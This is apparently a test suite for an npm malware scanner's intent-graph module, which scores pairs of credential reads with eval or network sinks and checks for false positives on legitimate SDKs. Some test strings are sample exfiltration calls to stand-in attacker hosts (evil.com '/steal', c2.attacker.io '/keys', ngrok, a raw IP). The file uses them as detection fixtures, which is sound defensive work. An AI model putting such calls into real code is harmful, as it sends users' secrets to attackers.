'use strict';

const path = require('path');
const os = require('os');
const fs = require('fs');
const { test, asyncTest, assert, assertIncludes, runScanDirect, addSkipped } = require('../test-utils');
const { classifySource, classifySink, buildIntentPairs, COHERENCE_MATRIX, isSDKPattern, extractEnvVarFromMessage, extractBrandFromEnvVar, SDK_ENV_DOMAIN_MAP } = require('../../src/intent-graph.js');

const ADVERSARIAL_DIR = path.join(__dirname, '..', '..', 'datasets', 'adversarial');
const INTENT_SAMPLES_DIR = path.join(__dirname, '..', 'samples', 'intent-graph');

async function runIntentGraphTests() {
  // =========================================================================
  // Unit tests: classifySource
  // =========================================================================

  test('INTENT: classifySource — sensitive_string → credential_read', () => {
    const result = classifySource({ type: 'sensitive_string', message: '.npmrc detected' });
    assert(result === 'credential_read', `Expected credential_read, got ${result}`);
  });

  test('INTENT: classifySource — env_access with sensitive var → credential_read', () => {
    const result = classifySource({ type: 'env_access', message: 'process.env.GITHUB_TOKEN' });
    assert(result === 'credential_read', `Expected credential_read for GITHUB_TOKEN, got ${result}`);
  });

  test('INTENT: classifySource — env_access with NODE_ENV → null (config)', () => {
    const result = classifySource({ type: 'env_access', message: 'process.env.NODE_ENV' });
    assert(result === null, `Expected null for NODE_ENV (config), got ${result}`);
  });

  test('INTENT: classifySource — env_access with PORT → null (config)', () => {
    const result = classifySource({ type: 'env_access', message: 'process.env.PORT' });
    assert(result === null, `Expected null for PORT (config), got ${result}`);
  });

  test('INTENT: classifySource — env_access with API_KEY → credential_read', () => {
    const result = classifySource({ type: 'env_access', message: 'process.env.API_KEY' });
    assert(result === 'credential_read', `Expected credential_read for API_KEY, got ${result}`);
  });

  test('INTENT: classifySource — env_harvesting_dynamic → credential_read', () => {
    const result = classifySource({ type: 'env_harvesting_dynamic', message: 'rest destructuring' });
    assert(result === 'credential_read', `Expected credential_read, got ${result}`);
  });

  test('INTENT: classifySource — suspicious_dataflow excluded (double-counting prevention)', () => {
    const result = classifySource({ type: 'suspicious_dataflow', message: 'credential_read + network' });
    assert(result === null, `Expected null (excluded), got ${result}`);
  });

  test('INTENT: classifySource — suspicious_dataflow telemetry_read also excluded', () => {
    const result = classifySource({ type: 'suspicious_dataflow', message: 'telemetry_read only' });
    assert(result === null, `Expected null (excluded), got ${result}`);
  });

  test('INTENT: classifySource — cross_file_dataflow excluded (already scored by module-graph)', () => {
    const result = classifySource({ type: 'cross_file_dataflow', message: 'credential_read in A → network in B' });
    assert(result === null, `Expected null (cross_file_dataflow excluded), got ${result}`);
  });

  test('INTENT: classifySource — unrelated type → null', () => {
    const result = classifySource({ type: 'obfuscation_detected', message: 'hex strings' });
    assert(result === null, `Expected null, got ${result}`);
  });

  test('INTENT: classifySource — message with .npmrc → credential_read', () => {
    const result = classifySource({ type: 'unknown_type', message: 'Reference to ".npmrc" detected.' });
    assert(result === 'credential_read', `Expected credential_read, got ${result}`);
  });

  // =========================================================================
  // Unit tests: classifySink
  // =========================================================================

  test('INTENT: classifySink — dangerous_call_eval → exec_sink', () => {
    const result = classifySink({ type: 'dangerous_call_eval', message: 'eval()' });
    assert(result === 'exec_sink', `Expected exec_sink, got ${result}`);
  });

  test('INTENT: classifySink — credential_tampering → file_tamper', () => {
    const result = classifySink({ type: 'credential_tampering', message: 'write to .npmrc' });
    assert(result === 'file_tamper', `Expected file_tamper, got ${result}`);
  });

  test('INTENT: classifySink — message with https.request → network_external', () => {
    const result = classifySink({ type: 'unknown_type', message: 'calls https.request to external host' });
    assert(result === 'network_external', `Expected network_external, got ${result}`);
  });

  test('INTENT: classifySink — unrelated type → null', () => {
    const result = classifySink({ type: 'obfuscation_detected', message: 'hex strings' });
    assert(result === null, `Expected null, got ${result}`);
  });

  // =========================================================================
  // Unit tests: coherence matrix
  // =========================================================================

  test('INTENT: coherence matrix — credential_read → network_external = +30 CRITICAL', () => {
    const entry = COHERENCE_MATRIX.credential_read.network_external;
    assert(entry.modifier === 30, `Expected modifier 30, got ${entry.modifier}`);
    assert(entry.severity === 'CRITICAL', `Expected CRITICAL, got ${entry.severity}`);
  });

  test('INTENT: coherence matrix — telemetry_read → network_external = 0', () => {
    const entry = COHERENCE_MATRIX.telemetry_read.network_external;
    assert(entry.modifier === 0, `Expected modifier 0, got ${entry.modifier}`);
  });

  test('INTENT: coherence matrix — command_output → network_external = +20 HIGH', () => {
    const entry = COHERENCE_MATRIX.command_output.network_external;
    assert(entry.modifier === 20, `Expected modifier 20, got ${entry.modifier}`);
    assert(entry.severity === 'HIGH', `Expected HIGH, got ${entry.severity}`);
  });

  test('INTENT: CROSS_FILE_MULTIPLIER removed (dead code)', () => {
    const exports = require('../../src/intent-graph.js');
    assert(!('CROSS_FILE_MULTIPLIER' in exports), 'CROSS_FILE_MULTIPLIER should be removed from exports');
  });

  // =========================================================================
  // Unit tests: buildIntentPairs
  // =========================================================================

  test('INTENT: buildIntentPairs — intra-file credential source + eval sink = +25', () => {
    const threats = [
      { type: 'sensitive_string', severity: 'HIGH', message: '.npmrc detected', file: 'index.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval() called', file: 'index.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.pairs.length > 0, 'Should have at least one pair');
    const credExec = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'exec_sink');
    assert(credExec, 'Should find credential_read → exec_sink pair');
    assert(credExec.modifier === 25, `Intra-file modifier should be 25, got ${credExec.modifier}`);
    assert(credExec.crossFile === false, 'Should be intra-file');
  });

  test('INTENT: buildIntentPairs — cross-file credential → exec = 0 (no cross-file pairing)', () => {
    // Cross-file co-occurrence is NOT paired — module-graph handles cross-file taint
    const threats = [
      { type: 'sensitive_string', severity: 'HIGH', message: '.npmrc detected', file: 'reader.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval() called', file: 'exec.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.pairs.length === 0, 'Cross-file co-occurrence should produce no pairs');
    assert(result.intentScore === 0, 'Intent score should be 0 for cross-file');
  });

  test('INTENT: buildIntentPairs — suspicious_dataflow excluded as source (no double-counting)', () => {
    const threats = [
      { type: 'suspicious_dataflow', severity: 'HIGH', message: 'credential_read + network', file: 'index.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.pairs.length === 0, 'suspicious_dataflow should produce no pairs (excluded)');
    assert(result.intentScore === 0, 'Intent score should be 0');
  });

  test('INTENT: buildIntentPairs — generates intent_credential_exfil threat for high-value pairs', () => {
    const threats = [
      { type: 'sensitive_string', severity: 'HIGH', message: '.npmrc detected', file: 'reader.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval() used', file: 'reader.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentThreats.length > 0, 'Should generate intent threats');
    assert(result.intentThreats[0].type === 'intent_credential_exfil',
      `Expected intent_credential_exfil, got ${result.intentThreats[0].type}`);
  });

  test('INTENT: buildIntentPairs — no pairs when no sources', () => {
    const threats = [
      { type: 'obfuscation_detected', severity: 'HIGH', message: 'hex strings', file: 'util.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.pairs.length === 0, 'Should have no pairs');
    assert(result.intentScore === 0, 'Intent score should be 0');
  });

  // =========================================================================
  // Integration: backward-compat — compound detections unchanged
  // =========================================================================

  test('INTENT: backward-compat — intent is always additive (>= 0)', () => {
    const threats = [
      { type: 'zlib_inflate_eval', severity: 'CRITICAL', message: 'zlib + eval', file: 'index.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentScore >= 0, `Intent score should be >= 0, got ${result.intentScore}`);
  });

  // =========================================================================
  // Integration: adversarial packages detection
  // =========================================================================

  // Group A: pure-API adversarial samples. Cross-file only, no eval/Function.
  // These are partially detected by individual scanners but the intent graph
  // cannot boost them (cross-file pairing removed to prevent FP explosion).
  // Full detection requires module-graph improvements for class/EventEmitter/stream taint.

  const sampleNames = [
    'locale-config-sync', 'metrics-aggregator-lite', 'env-config-validator',
    'stream-transform-kit', 'cache-warmup-utils', 'fn-return-eval',
    'call-chain-eval', 'regex-source-require', 'charcode-arithmetic', 'object-method-alias'
  ];
  const samplesExist = sampleNames.some(n => fs.existsSync(path.join(ADVERSARIAL_DIR, n)));

  if (!samplesExist) {
    addSkipped(10);
  } else {
    await asyncTest('INTENT: A1 locale-config-sync partially detected (cross-file class taint)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'locale-config-sync');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 10,
        `locale-config-sync should score >= 10, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: A2 metrics-aggregator-lite partially detected (EventEmitter gap)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'metrics-aggregator-lite');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 3,
        `metrics-aggregator-lite should score >= 3, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: A3 env-config-validator partially detected (rest destructuring)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'env-config-validator');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 10,
        `env-config-validator should score >= 10, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: A4 stream-transform-kit partially detected (stream pipe gap)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'stream-transform-kit');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 10,
        `stream-transform-kit should score >= 10, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: A5 cache-warmup-utils detected', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'cache-warmup-utils');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 25,
        `cache-warmup-utils should score >= 25, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: B1 fn-return-eval detected (eval factory)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'fn-return-eval');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 25,
        `fn-return-eval should score >= 25, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: B2 call-chain-eval detected (.call.call evasion)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'call-chain-eval');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 20,
        `call-chain-eval should score >= 20, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: B3 regex-source-require detected (regex .source)', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'regex-source-require');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 25,
        `regex-source-require should score >= 25, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: B4 charcode-arithmetic detected', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'charcode-arithmetic');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 25,
        `charcode-arithmetic should score >= 25, got ${result.summary.riskScore}`);
    });

    await asyncTest('INTENT: B5 object-method-alias detected', async () => {
      const dir = path.join(ADVERSARIAL_DIR, 'object-method-alias');
      if (!fs.existsSync(dir)) { addSkipped(1); return; }
      const result = await runScanDirect(dir, { _capture: true });
      assert(result.summary.riskScore >= 25,
        `object-method-alias should score >= 25, got ${result.summary.riskScore}`);
    });
  }

  // =========================================================================
  // Negative tests: scanner fixes should not FP on benign patterns
  // =========================================================================

  test('INTENT: negative — arrow function not returning eval is not an eval factory', () => {
    const result = classifySource({ type: 'dynamic_require', message: 'require(x)' });
    assert(result === null, 'dynamic_require should not be a source');
  });

  test('INTENT: negative — benign package with only telemetry should get 0 intent', () => {
    const threats = [
      { type: 'suspicious_dataflow', severity: 'HIGH', message: 'telemetry_read (os.platform) + network send', file: 'index.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentScore === 0, `Telemetry-only should score 0, got ${result.intentScore}`);
  });

  test('INTENT: negative — SDK with env_access + eval should get 0 intent (env_access excluded)', () => {
    // aws-sdk, mailgun, bluebird all have env_access + eval/Function — NOT malicious
    const threats = [
      { type: 'env_access', severity: 'MEDIUM', message: 'process.env.AWS_REGION', file: 'lib/config.js' },
      { type: 'dangerous_call_function', severity: 'HIGH', message: 'new Function()', file: 'lib/util.js' },
      { type: 'suspicious_dataflow', severity: 'CRITICAL', message: 'credential_read + network', file: 'lib/http.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentScore === 0, `SDK pattern should score 0 intent, got ${result.intentScore}`);
    assert(result.intentThreats.length === 0, 'Should not generate intent threats for SDKs');
  });

  test('INTENT: negative — cross-file source+sink in different files = 0 intent (no co-occurrence pairing)', () => {
    // This is the key FP prevention test: a package with credential read in one file
    // and network call in another should NOT get intent boost without proven data flow
    const threats = [
      { type: 'sensitive_string', severity: 'HIGH', message: '.npmrc detected', file: 'lib/config.js' },
      { type: 'env_harvesting_dynamic', severity: 'HIGH', message: 'Object.keys(process.env)', file: 'lib/config.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval()', file: 'lib/template.js' },
      { type: 'dangerous_call_function', severity: 'HIGH', message: 'new Function()', file: 'lib/util.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentScore === 0, `Cross-file only pattern should score 0, got ${result.intentScore}`);
    assert(result.intentThreats.length === 0, 'Should not generate intent threats for cross-file co-occurrence');
  });

  // --- v2.6.5: env_access conditional pairing ---

  test('INTENT: env_access(TOKEN) + network in same file → intent pair', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.GITHUB_TOKEN', file: 'steal.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval()', file: 'steal.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentScore > 0, `env_access(TOKEN) + eval in same file should produce intent score, got ${result.intentScore}`);
  });

  test('INTENT: env_access(NODE_ENV) + network in same file → no intent pair', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.NODE_ENV', file: 'config.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval()', file: 'config.js' }
    ];
    const result = buildIntentPairs(threats);
    assert(result.intentScore === 0, `env_access(NODE_ENV) should not produce intent pair, got ${result.intentScore}`);
  });

  // =========================================================================
  // Unit tests: extractEnvVarFromMessage
  // =========================================================================

  test('INTENT: extractEnvVarFromMessage — process.env.SALESFORCE_API_KEY', () => {
    const threats = [{ message: 'process.env.SALESFORCE_API_KEY accessed' }];
    const result = extractEnvVarFromMessage(threats);
    assert(result === 'SALESFORCE_API_KEY', `Expected SALESFORCE_API_KEY, got ${result}`);
  });

  test('INTENT: extractEnvVarFromMessage — standalone var name', () => {
    const threats = [{ message: 'env var MAILGUN_API_KEY detected in code' }];
    const result = extractEnvVarFromMessage(threats);
    assert(result === 'MAILGUN_API_KEY', `Expected MAILGUN_API_KEY, got ${result}`);
  });

  test('INTENT: extractEnvVarFromMessage — no env var in message', () => {
    const threats = [{ message: '.npmrc file read detected' }];
    const result = extractEnvVarFromMessage(threats);
    assert(result === null, `Expected null for non-env message, got ${result}`);
  });

  // =========================================================================
  // Unit tests: extractBrandFromEnvVar
  // =========================================================================

  test('INTENT: extractBrandFromEnvVar — MAILGUN_API_KEY → MAILGUN', () => {
    assert(extractBrandFromEnvVar('MAILGUN_API_KEY') === 'MAILGUN', 'Should extract MAILGUN');
  });

  test('INTENT: extractBrandFromEnvVar — SALESFORCE_CLIENT_SECRET → SALESFORCE', () => {
    assert(extractBrandFromEnvVar('SALESFORCE_CLIENT_SECRET') === 'SALESFORCE', 'Should extract SALESFORCE');
  });

  test('INTENT: extractBrandFromEnvVar — API_KEY → null (all noise tokens)', () => {
    assert(extractBrandFromEnvVar('API_KEY') === null, 'Should return null for all-noise tokens');
  });

  // =========================================================================
  // Unit tests: isSDKPattern
  // =========================================================================

  test('INTENT: isSDKPattern — SALESFORCE_API_KEY + salesforce.com → true', () => {
    const content = 'const url = "https://login.salesforce.com/services/oauth2/token";';
    assert(isSDKPattern('SALESFORCE_API_KEY', content) === true, 'Salesforce SDK should match');
  });

  test('INTENT: isSDKPattern — MAILGUN_API_KEY + mailgun.net → true', () => {
    const content = 'fetch("https://api.mailgun.net/v3/messages", { headers: {} })';
    assert(isSDKPattern('MAILGUN_API_KEY', content) === true, 'Mailgun SDK should match');
  });

  test('INTENT: isSDKPattern — STRIPE_SECRET_KEY + stripe.com → true', () => {
    const content = 'const res = await fetch("https://api.stripe.com/v1/charges");';
    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === true, 'Stripe SDK should match');
  });

  test('INTENT: isSDKPattern — MAILGUN_API_KEY + evil.com → false (domain mismatch)', () => {
    const content = 'https.request({ hostname: "evil.com", path: "/steal" })';
    assert(isSDKPattern('MAILGUN_API_KEY', content) === false, 'Mismatch domain should not match');
  });

  test('INTENT: isSDKPattern — STRIPE_SECRET_KEY + stripe.com + evil.com → false (dual exfil)', () => {
    const content = `
      fetch("https://api.stripe.com/v1/charges");
      fetch("https://c2.attacker.io/keys");
    `;
    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'Dual exfil should not match');
  });

  test('INTENT: isSDKPattern — no URLs in file → false (default suspicious)', () => {
    const content = 'const key = process.env.STRIPE_SECRET_KEY; doSomething(key);';
    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'No URLs should default to suspicious');
  });

  test('INTENT: isSDKPattern — ngrok tunnel domain → false (tunneling)', () => {
    const content = 'fetch("https://abc123.ngrok.io/api/data");';
    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'ngrok should be blocked');
  });

  test('INTENT: isSDKPattern — raw IP address → false', () => {
    const content = 'fetch("https://192.168.1.100/exfil");';
    assert(isSDKPattern('STRIPE_SECRET_KEY', content) === false, 'Raw IP should be blocked');
  });

  test('INTENT: isSDKPattern — heuristic fallback: ACME_API_KEY + api.acme.com → true', () => {
    const content = 'fetch("https://api.acme.com/v1/resource");';
    assert(isSDKPattern('ACME_API_KEY', content) === true, 'Heuristic brand match should work');
  });

  test('INTENT: isSDKPattern — heuristic: ACME_API_KEY + acmetech.com → false (substring, not label)', () => {
    const content = 'fetch("https://api.acmetech.com/v1/resource");';
    assert(isSDKPattern('ACME_API_KEY', content) === false, 'Substring match should not work');
  });

  test('INTENT: isSDKPattern — domain mimicry: api-mailgun.evil.com → false', () => {
    const content = 'fetch("https://api-mailgun.evil.com/steal");';
    assert(isSDKPattern('MAILGUN_API_KEY', content) === false, 'Domain mimicry should fail (suffix mismatch)');
  });

  // =========================================================================
  // Unit tests: SDK_ENV_DOMAIN_MAP coverage
  // =========================================================================

  test('INTENT: SDK_ENV_DOMAIN_MAP has 22 entries', () => {
    assert(SDK_ENV_DOMAIN_MAP.length === 22, `Expected 22 SDK mappings, got ${SDK_ENV_DOMAIN_MAP.length}`);
  });

  // =========================================================================
  // Integration: buildIntentPairs with targetPath (SDK detection)
  // =========================================================================

  test('INTENT: buildIntentPairs with SDK fixture — salesforce → no intent threat', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.SALESFORCE_API_KEY', file: 'sdk-salesforce.js' },
      { type: 'suspicious_dataflow', severity: 'CRITICAL', message: 'calls https.request to external host', file: 'sdk-salesforce.js' }
    ];
    // suspicious_dataflow is excluded as source, and env_access with SALESFORCE_API_KEY → credential_read
    // The sink is from message pattern matching
    const threats2 = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.SALESFORCE_API_KEY', file: 'sdk-salesforce.js' },
      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-salesforce.js' }
    ];
    const result = buildIntentPairs(threats2, INTENT_SAMPLES_DIR);
    assert(result.intentThreats.length === 0,
      `SDK Salesforce should produce no intent threats, got ${result.intentThreats.length}`);
  });

  test('INTENT: buildIntentPairs with mismatch fixture — MAILGUN + evil.com → intent threat', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.MAILGUN_API_KEY', file: 'sdk-mismatch.js' },
      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-mismatch.js' }
    ];
    const result = buildIntentPairs(threats, INTENT_SAMPLES_DIR);
    // credential_read → network_external, domain mismatch → CRITICAL pair
    const credNetPair = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'network_external');
    assert(credNetPair, 'Mismatch should produce credential_read → network_external pair');
  });

  test('INTENT: buildIntentPairs with dual-exfil fixture — stripe + evil → intent threat', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.STRIPE_SECRET_KEY', file: 'sdk-evil-dual.js' },
      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-evil-dual.js' }
    ];
    const result = buildIntentPairs(threats, INTENT_SAMPLES_DIR);
    const credNetPair = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'network_external');
    assert(credNetPair, 'Dual exfil should still produce credential_read → network_external pair');
  });

  test('INTENT: buildIntentPairs without targetPath — backward compat, no SDK check', () => {
    const threats = [
      { type: 'env_access', severity: 'HIGH', message: 'process.env.SALESFORCE_API_KEY', file: 'sdk-salesforce.js' },
      { type: 'prototype_hook', severity: 'HIGH', message: 'calls https.request to external host', file: 'sdk-salesforce.js' }
    ];
    const result = buildIntentPairs(threats);
    // Without targetPath, SDK check is skipped → pair should be created
    const credNetPair = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'network_external');
    assert(credNetPair, 'Without targetPath, SDK check should be skipped');
  });

  test('INTENT: buildIntentPairs — exec_sink pair NOT affected by SDK check', () => {
    // SDK check only applies to credential_read → network_external
    const threats = [
      { type: 'sensitive_string', severity: 'HIGH', message: '.npmrc detected', file: 'sdk-salesforce.js' },
      { type: 'dangerous_call_eval', severity: 'CRITICAL', message: 'eval() called', file: 'sdk-salesforce.js' }
    ];
    const result = buildIntentPairs(threats, INTENT_SAMPLES_DIR);
    const credExec = result.pairs.find(p => p.sourceType === 'credential_read' && p.sinkType === 'exec_sink');
    assert(credExec, 'credential_read → exec_sink should NOT be affected by SDK check');
  });
}

module.exports = { runIntentGraphTests };
